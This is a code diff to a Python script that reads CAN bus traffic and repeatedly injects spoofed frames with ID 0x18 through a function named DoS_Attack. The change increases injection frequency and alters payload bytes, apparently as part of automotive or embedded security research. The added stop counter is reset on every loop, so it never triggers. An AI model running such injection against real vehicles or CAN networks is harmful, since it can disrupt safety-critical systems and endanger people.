@@ -102,22 +102,38 @@ if __name__ == "__main__":
     while True:
         injection_id = "0018"
         mess = CAN.Read(CAN_BUS)
-        k = 2
-        for _ in range(k):
-            if hex(mess[1].ID) == "0x18":
+        k = 15
+        cnt_b = 0
+        if hex(mess[1].ID) == "0x18":
+            cnt_b += 1
+            if cnt_b > 300:
+                print("Bye Bye")
+                break
+            first_injection = True
+            for _ in range(k):
                 # for j in range(8):
                 #     print(hex(mess[1].DATA[j]), end = " ")
                 # print()
                 time.sleep(0.03/k)
+                # if injected and first_injection:
+                #     using_bytes[5] = msg_dict[5][0][0]
+                #     injected = False
+                #     DoS_Attack(injection_id, using_bytes)
+                #     time.sleep(0.03/k)
+                #     DoS_Attack(injection_id, using_bytes)
+                #     first_injection = False
                 if injected:
                     using_bytes[5] = msg_dict[5][0][0]
                     injected = False
                     DoS_Attack(injection_id, using_bytes)
                     time.sleep(0.03/k)
                     DoS_Attack(injection_id, using_bytes)
-                    
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
+                    time.sleep(0.03/k)
+                    DoS_Attack(injection_id, using_bytes)
                 else:
-                    using_bytes[5] = msg_dict[5][0][1]
+                    using_bytes[5] = msg_dict[5][0][3]
                     injected = True
                     DoS_Attack(injection_id, using_bytes)
                     time.sleep(0.03/k)
